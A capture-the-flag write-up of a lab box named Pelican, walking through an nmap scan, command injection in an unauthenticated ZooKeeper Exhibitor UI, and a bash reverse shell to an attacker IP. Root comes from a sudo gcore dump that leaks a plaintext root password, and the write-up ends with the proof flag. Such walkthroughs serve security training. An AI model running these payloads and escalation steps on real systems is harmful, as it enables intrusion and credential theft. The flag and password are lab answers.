# CTF Writeup: Pelican

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.156.98
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 14:54 EST
Nmap scan report for 192.168.156.98
Host is up (0.024s latency).
Not shown: 65526 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
631/tcp   open  ipp         CUPS 2.2
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/2.2 IPP/2.1
|_http-title: Forbidden - CUPS v2.2.10
2181/tcp  open  zookeeper   Zookeeper 3.4.6-1569965 (Built on 02/20/2014)
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 a8:e1:60:68:be:f5:8e:70:70:54:b4:27:ee:9a:7e:7f (RSA)
|   256 bb:99:9a:45:3f:35:0b:b3:49:e6:cf:11:49:87:8d:94 (ECDSA)
|_  256 f2:eb:fc:45:d7:e9:80:77:66:a3:93:53:de:00:57:9c (ED25519)
8080/tcp  open  http        Jetty 1.0
|_http-server-header: Jetty(1.0)
|_http-title: Error 404 Not Found
8081/tcp  open  http        nginx 1.14.2
|_http-title: Did not follow redirect to http://192.168.156.98:8080/exhibitor/v1/ui/index.html
|_http-server-header: nginx/1.14.2
46295/tcp open  java-rmi    Java RMI
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: Host: PELICAN; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2025-12-19T19:55:08
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: pelican
|   NetBIOS computer name: PELICAN\x00
|   Domain name: \x00
|   FQDN: pelican
|_  System time: 2025-12-19T14:55:06-05:00
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   24.29 ms 192.168.45.1
2   22.70 ms 192.168.45.254
3   24.60 ms 192.168.251.1
4   24.97 ms 192.168.156.98

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.73 seconds
```


## Vulnerability Assessment

The nmap scan reveals a lot of information about running services on the target. I searched them all up manually and found smth interesting for the ZooKeeper Service / Web-UI of it. This "Exhibitor" Web UI is publicly available and also requires no authentification. The Exploit tells us that in the "java.env script" is an command injection vulnerability.

## Initial Access

I pasted the following command injection right behind the normal parameter to receive RCE.
Before doing that i started up an listener on port 4444.

```
nc -lvnp 4444
```

```
export JAVA_OPTS="-Xms1000m -Xmx1000m"$(/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.206/4444 0>&1')
```

```
nc -lvnp 4444                                    
listening on [any] 4444 ...
connect to [192.168.45.206] from (UNKNOWN) [192.168.156.98] 40294
bash: cannot set terminal process group (501): Inappropriate ioctl for device
bash: no job control in this shell
charles@pelican:/opt/zookeeper$
```

## Privilege Escalation

We are able to run the gcore binary with sudo rights.

```
charles@pelican:~$ sudo -l
sudo -l
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

Searching up on gtfobins.github.io, we can findout that it creates an file, which is able to generate core dumps of running processes.


Using the following syntax we can create an core dump of an process, using the PID of it.

```
sudo gcore -a -o files <PID>
```

Let's find out PID's running as root.

```
charles@pelican:~$ ps aux | awk '$1=="root" {print $0}'
ps aux | awk '$1=="root" {print $0}'
root         1  0.0  0.5 103980 10276 ?        Ss   14:50   0:00 /sbin/init
root         2  0.0  0.0      0     0 ?        S    14:50   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   14:50   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   14:50   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   14:50   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    14:50   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    14:50   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        I    14:50   0:00 [rcu_bh]
root        12  0.0  0.0      0     0 ?        S    14:50   0:00 [migration/0]
root        14  0.0  0.0      0     0 ?        S    14:50   0:00 [cpuhp/0]
root        15  0.0  0.0      0     0 ?        S    14:50   0:00 [kdevtmpfs]
root        16  0.0  0.0      0     0 ?        I<   14:50   0:00 [netns]
root        17  0.0  0.0      0     0 ?        S    14:50   0:00 [kauditd]
root        18  0.0  0.0      0     0 ?        S    14:50   0:00 [khungtaskd]
root        19  0.0  0.0      0     0 ?        S    14:50   0:00 [oom_reaper]
root        20  0.0  0.0      0     0 ?        I<   14:50   0:00 [writeback]
root        21  0.0  0.0      0     0 ?        S    14:50   0:00 [kcompactd0]
root        22  0.0  0.0      0     0 ?        SN   14:50   0:00 [ksmd]
root        23  0.0  0.0      0     0 ?        SN   14:50   0:00 [khugepaged]
root        24  0.0  0.0      0     0 ?        I<   14:50   0:00 [crypto]
root        25  0.0  0.0      0     0 ?        I<   14:50   0:00 [kintegrityd]
root        26  0.0  0.0      0     0 ?        I<   14:50   0:00 [kblockd]
root        27  0.0  0.0      0     0 ?        I<   14:50   0:00 [edac-poller]
root        28  0.0  0.0      0     0 ?        I<   14:50   0:00 [devfreq_wq]
root        29  0.0  0.0      0     0 ?        S    14:50   0:00 [watchdogd]
root        30  0.0  0.0      0     0 ?        S    14:50   0:00 [kswapd0]
root        48  0.0  0.0      0     0 ?        I<   14:50   0:00 [kthrotld]
root        49  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/24-pciehp]
root        50  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/25-pciehp]
root        51  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/26-pciehp]
root        52  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/27-pciehp]
root        53  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/28-pciehp]
root        54  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/29-pciehp]
root        55  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/30-pciehp]
root        56  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/31-pciehp]
root        57  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/32-pciehp]
root        58  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/33-pciehp]
root        59  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/34-pciehp]
root        60  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/35-pciehp]
root        61  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/36-pciehp]
root        62  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/37-pciehp]
root        63  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/38-pciehp]
root        64  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/39-pciehp]
root        65  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/40-pciehp]
root        66  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/41-pciehp]
root        67  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/42-pciehp]
root        68  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/43-pciehp]
root        69  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/44-pciehp]
root        70  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/45-pciehp]
root        71  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/46-pciehp]
root        72  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/47-pciehp]
root        73  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/48-pciehp]
root        74  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/49-pciehp]
root        75  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/50-pciehp]
root        76  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/51-pciehp]
root        77  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/52-pciehp]
root        78  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/53-pciehp]
root        79  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/54-pciehp]
root        80  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/55-pciehp]
root        81  0.0  0.0      0     0 ?        I<   14:50   0:00 [kstrp]
root       123  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_0]
root       125  0.0  0.0      0     0 ?        I<   14:50   0:00 [scsi_tmf_0]
root       127  0.0  0.0      0     0 ?        I<   14:50   0:00 [vmw_pvscsi_wq_0]
root       129  0.0  0.0      0     0 ?        I    14:50   0:00 [kworker/u2:1-events_unbound]
root       132  0.0  0.0      0     0 ?        I<   14:50   0:00 [ata_sff]
root       134  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/0:1H-kblockd]
root       136  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_1]
root       138  0.0  0.0      0     0 ?        I<   14:50   0:00 [scsi_tmf_1]
root       139  0.0  0.0      0     0 ?        S    14:50   0:00 [scsi_eh_2]
root       142  0.0  0.0      0     0 ?        I<   14:50   0:00 [scsi_tmf_2]
root       149  0.0  0.0      0     0 ?        I<   14:50   0:00 [ttm_swap]
root       151  0.0  0.0      0     0 ?        S    14:50   0:00 [irq/16-vmwgfx]
root       184  0.0  0.0      0     0 ?        I    14:50   0:00 [kworker/0:2-events_freezable_power_]
root       220  0.0  0.0      0     0 ?        I<   14:50   0:00 [kworker/u3:0]
root       222  0.0  0.0      0     0 ?        S    14:50   0:00 [jbd2/sda1-8]
root       223  0.0  0.0      0     0 ?        I<   14:50   0:00 [ext4-rsv-conver]
root       256  0.0  0.4  43112  8944 ?        Ss   14:50   0:00 /lib/systemd/systemd-journald
root       278  0.0  0.2  22476  5040 ?        Ss   14:50   0:00 /lib/systemd/systemd-udevd
root       314  0.0  0.5  48220 10836 ?        Ss   14:50   0:00 /usr/bin/VGAuthService
root       334  0.0  0.6 123176 12608 ?        Ssl  14:50   0:01 /usr/bin/vmtoolsd
root       421  0.0  0.3 225824  6412 ?        Ssl  14:50   0:00 /usr/sbin/rsyslogd -n -iNONE
root       424  0.0  0.2  19768  5200 ?        Ss   14:50   0:00 /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
root       428  0.0  0.1   8504  2692 ?        Ss   14:50   0:00 /usr/sbin/cron -f
root       430  0.0  0.6 398428 13844 ?        Ssl  14:50   0:00 /usr/lib/udisks2/udisksd
root       440  0.0  0.5 318328 12168 ?        Ssl  14:50   0:00 /usr/sbin/ModemManager --filter-policy=strict
root       444  0.0  0.1   9468  2344 ?        S    14:50   0:00 /usr/sbin/CRON -f
root       448  0.0  0.3  19532  7256 ?        Ss   14:50   0:00 /lib/systemd/systemd-logind
root       473  0.0  0.0   2388  1608 ?        Ss   14:50   0:00 /bin/sh -c while true; do chown -R charles:charles /opt/zookeeper && chown -R charles:charles /opt/exhibitor && sleep 1; done
root       483  0.0  0.5 184976 10996 ?        Ssl  14:50   0:00 /usr/sbin/cups-browsed
root       490  0.0  0.0   2276    72 ?        Ss   14:50   0:00 /usr/bin/password-store
root       491  0.0  0.4 235840  8896 ?        Ssl  14:50   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       525  0.0  0.3 313364  7068 ?        Ssl  14:50   0:00 /usr/sbin/lightdm
root       529  0.0  0.3  15852  6820 ?        Ss   14:50   0:00 /usr/sbin/sshd -D
root       555  0.0  0.0   5612  1488 tty1     Ss+  14:50   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root       556  0.0  2.2 224980 45924 tty7     Ssl+ 14:50   0:00 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
root       558  0.0  0.0  69740  1700 ?        Ss   14:50   0:00 nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
root       640  0.0  0.4 105112  9604 ?        Ssl  14:50   0:00 /usr/sbin/cupsd -l
root       656  0.0  0.3 166792  7144 ?        Sl   14:50   0:00 lightdm --session-child 18 21
root       714  0.0  0.2  18748  5172 ?        S    14:50   0:00 lightdm --session-child 14 21
root      1317  0.0  1.0  50144 21328 ?        Ss   14:52   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1319  0.0  0.2  46672  5964 ?        S    14:52   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1320  0.0  0.2  46680  6000 ?        S    14:52   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1322  0.0  0.3  50136  7244 ?        S    14:52   0:00 /usr/sbin/smbd --foreground --no-process-group
root      1555  0.0  0.7 258856 15728 ?        Ssl  14:52   0:00 /usr/sbin/NetworkManager --no-daemon
root     11977  0.0  0.0      0     0 ?        I    15:31   0:00 [kworker/u2:8-flush-8:0]
root     20613  0.0  0.0      0     0 ?        I    16:03   0:00 [kworker/0:1-ata_sff]
root     21987  0.0  0.0      0     0 ?        I    16:08   0:00 [kworker/0:0-ata_sff]
root     22844  0.0  0.0   5260   740 ?        S    16:11   0:00 sleep 1
```

The /usr/bin/password-store looks very promising. The PID of it is "490"

We used the following command to receive an core dump file of the password-store service which runs as root.

Performing forensic on this with "strings".

We can identify the root password.

```
charles@pelican:~$ strings file.490
strings file.490
CORE
password-store
/usr/bin/password-store 
CORE
CORE
/usr/bin/passwor
////////////////
LINUX
/usr/bin/passwor
////////////////
IGISCORE
CORE
ELIFCORE
/usr/bin/password-store
/usr/bin/password-store
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/libc-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
/usr/lib/x86_64-linux-gnu/ld-2.28.so
fork failed!
/tmp
;*3$"
aliases
ethers
group
gshadow
hosts
initgroups
netgroup
networks
passwd
protocols
publickey
services
shadow
CAk[S
libc.so.6
/lib/x86_64-linux-gnu
libc.so.6
;*3$"
sse2
x86_64
avx512_1
i586
i686
haswell
xeon_phi
linux-vdso.so.1
tls/x86_64/x86_64/tls/x86_64/
/lib/x86_64-linux-gnu/libc.so.6
/usr/bin/passwor
////////////////
/usr/bin/passwor
////////////////
001 Password: root:
ClogKingpinInning731
x86_64
/usr/bin/password-store
HOME=/root
LOGNAME=root
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
LANG=en_US.UTF-8
SHELL=/bin/sh
PWD=/root
/usr/bin/password-store
bemX
__vdso_clock_gettime
__vdso_gettimeofday
__vdso_time
__vdso_getcpu
linux-vdso.so.1
LINUX_2.6
Linux
Linux
4.19.0-10-amd64
AVAUATSH
[A\A]A^]
D9+u
[A\A]A^]
D9#u
H+=x
H#=y
H+=K
H#=L
AVAUATI
[A\A]A^]
GCC: (Debian 8.3.0-6) 8.3.0
.shstrtab
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_d
.dynamic
.rodata
.note
.eh_frame_hdr
.eh_frame
.text
.altinstructions
.altinstr_replacement
.comment
.shstrtab
note0
load
```

Logged into root & retrieved the proof.txt in the /root directory.

```
eee2c02908206ee86dd14197ab57ac68
```
